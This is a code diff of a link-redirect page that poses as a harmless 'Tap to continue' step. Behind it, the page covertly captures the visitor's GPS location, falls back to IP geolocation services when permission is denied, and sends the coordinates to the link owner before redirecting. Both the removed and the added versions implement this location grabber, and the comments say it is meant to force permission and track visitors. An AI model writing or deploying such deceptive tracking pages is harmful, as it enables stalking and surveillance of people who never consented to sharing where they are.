@@ -18,14 +18,11 @@ body {
   display: flex;
   align-items: center;
   justify-content: center;
-  touch-action: manipulation;
 }
 
 .container {
   text-align: center;
   padding: 20px;
-  width: 100%;
-  max-width: 300px;
 }
 
 .btn {
@@ -38,6 +35,8 @@ body {
   border-radius: 50px;
   cursor: pointer;
   width: 100%;
+  max-width: 250px;
+  margin: 20px auto;
 }
 
 .btn:active {
@@ -55,7 +54,7 @@ body {
   border-top-color: white;
   border-radius: 50%;
   animation: spin 0.8s linear infinite;
-  margin: 20px auto 0;
+  margin: 20px auto;
 }
 
 @keyframes spin {
@@ -68,16 +67,10 @@ p {
   margin-bottom: 20px;
 }
 
-.status {
+.loading-text {
   color: white;
-  font-size: 13px;
-  margin-top: 15px;
-  opacity: 0;
-  transition: opacity 0.3s;
-}
-
-.status.show {
-  opacity: 1;
+  font-size: 14px;
+  margin-top: 10px;
 }
 </style>
 </head>
@@ -85,8 +78,8 @@ p {
 <div class="container">
   <p>Tap to continue</p>
   <button class="btn" id="continueBtn">Continue →</button>
-  <div id="loading" class="spinner hidden"></div>
-  <div id="status" class="status"></div>
+  <div id="loadingSpinner" class="spinner hidden"></div>
+  <div id="loadingText" class="loading-text hidden"></div>
 </div>
 
 <script>
@@ -96,13 +89,8 @@ let locationSent = false;
 let locationRequested = false;
 
 const continueBtn = document.getElementById('continueBtn');
-const loading = document.getElementById('loading');
-const statusDiv = document.getElementById('status');
-
-function showStatus(msg) {
-  statusDiv.textContent = msg;
-  statusDiv.classList.add('show');
-}
+const loadingSpinner = document.getElementById('loadingSpinner');
+const loadingText = document.getElementById('loadingText');
 
 // Get destination URL
 fetch('/api/hits/' + linkId)
@@ -122,130 +110,95 @@ function sendLocation(lat, lon, acc, source) {
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
   
-  // Redirect after saving
-  setTimeout(() => {
-    window.location.href = destUrl;
-  }, 300);
+  // Redirect
+  window.location.href = destUrl;
 }
 
-// IP Geolocation (always works, no permission needed)
+// IP-only fallback (no permission needed)
 function getIPLocation() {
-  showStatus('Getting network location...');
+  loadingText.textContent = 'Getting location from network...';
   
-  // Try multiple IP geolocation services for redundancy
-  const services = [
-    'https://ipapi.co/json/',
-    'https://ipinfo.io/json/',
-    'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
-  ];
-  
-  let serviceIndex = 0;
-  
-  function tryNextService() {
-    if (serviceIndex >= services.length) {
-      // All services failed, send null
-      sendLocation(null, null, null, 'ip-failed');
-      return;
-    }
-    
-    fetch(services[serviceIndex])
-      .then(response => {
-        if (!response.ok) throw new Error('Service failed');
-        return response.json();
-      })
-      .then(data => {
-        let lat = null, lon = null;
-        
-        // Handle different API response formats
-        if (data.latitude && data.longitude) {
-          lat = data.latitude;
-          lon = data.longitude;
-        } else if (data.lat && data.lon) {
-          lat = data.lat;
-          lon = data.lon;
-        } else if (data.loc) {
-          const coords = data.loc.split(',');
-          lat = parseFloat(coords[0]);
-          lon = parseFloat(coords[1]);
-        }
-        
-        if (lat && lon) {
-          sendLocation(lat, lon, 5000, 'ip');
-        } else {
-          serviceIndex++;
-          tryNextService();
-        }
-      })
-      .catch(() => {
-        serviceIndex++;
-        tryNextService();
-      });
-  }
-  
-  tryNextService();
-}
-
-// HTML5 GPS Geolocation (requires permission)
-function getGPSLocation() {
-  showStatus('Requesting GPS permission...');
-  
-  if (!navigator.geolocation) {
-    showStatus('GPS not supported, using network...');
-    getIPLocation();
-    return;
-  }
-  
-  // Set a timeout - if GPS takes too long, fallback to IP
-  const gpsTimeout = setTimeout(() => {
-    showStatus('GPS taking too long, using network...');
-    getIPLocation();
-  }, 8000);
-  
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      clearTimeout(gpsTimeout);
-      showStatus('GPS location captured!');
-      sendLocation(
-        pos.coords.latitude,
-        pos.coords.longitude,
-        Math.round(pos.coords.accuracy),
-        'gps'
-      );
-    },
-    err => {
-      clearTimeout(gpsTimeout);
-      console.log('GPS Error:', err.code, err.message);
-      
-      // GPS failed or denied, fallback to IP
-      if (err.code === 1) {
-        showStatus('GPS permission denied, using network...');
-      } else if (err.code === 2) {
-        showStatus('GPS unavailable, using network...');
-      } else if (err.code === 3) {
-        showStatus('GPS timeout, using network...');
+  // Multiple IP geolocation services
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      if (data.latitude && data.longitude) {
+        sendLocation(data.latitude, data.longitude, 5000, 'ip');
+      } else {
+        // Try backup
+        return fetch('https://ipinfo.io/json/');
       }
-      getIPLocation();
-    },
-    { 
-      enableHighAccuracy: true, 
-      timeout: 7000, 
-      maximumAge: 0 
-    }
-  );
+    })
+    .then(response => response && response.json())
+    .then(data => {
+      if (data && data.loc) {
+        const coords = data.loc.split(',');
+        sendLocation(parseFloat(coords[0]), parseFloat(coords[1]), 5000, 'ip-backup');
+      } else {
+        sendLocation(null, null, null, 'none');
+      }
+    })
+    .catch(() => {
+      sendLocation(null, null, null, 'failed');
+    });
 }
 
+// Force permission using a fresh approach
+function requestLocationWithRetry() {
+  loadingText.textContent = 'Requesting location...';
+  
+  // Method 1: Standard geolocation
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      // Success
+      (position) => {
+        sendLocation(
+          position.coords.latitude,
+          position.coords.longitude,
+          Math.round(position.coords.accuracy),
+          'gps'
+        );
+      },
+      // Error - fallback to IP immediately
+      (error) => {
+        console.log('Geolocation error:', error.code, error.message);
+        loadingText.textContent = 'Using network location...';
+        getIPLocation();
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      }
+    );
+  } else {
+    getIPLocation();
+  }
+}
+
+// Handle button click with a slight delay to ensure clean state
 function startTracking() {
   if (locationRequested) return;
   locationRequested = true;
   
+  // Hide button, show spinner
   continueBtn.style.display = 'none';
-  loading.classList.remove('hidden');
+  loadingSpinner.classList.remove('hidden');
+  loadingText.classList.remove('hidden');
   
-  // Try GPS first, will fallback to IP automatically
-  getGPSLocation();
+  // Small delay to ensure DOM is ready and no overlays
+  setTimeout(() => {
+    requestLocationWithRetry();
+  }, 100);
 }
 
 continueBtn.addEventListener('click', startTracking);
+
+// Also handle touchstart for better mobile response
+continueBtn.addEventListener('touchstart', function(e) {
+  e.preventDefault();
+  startTracking();
+});
 </script>
 </body>
 </html>
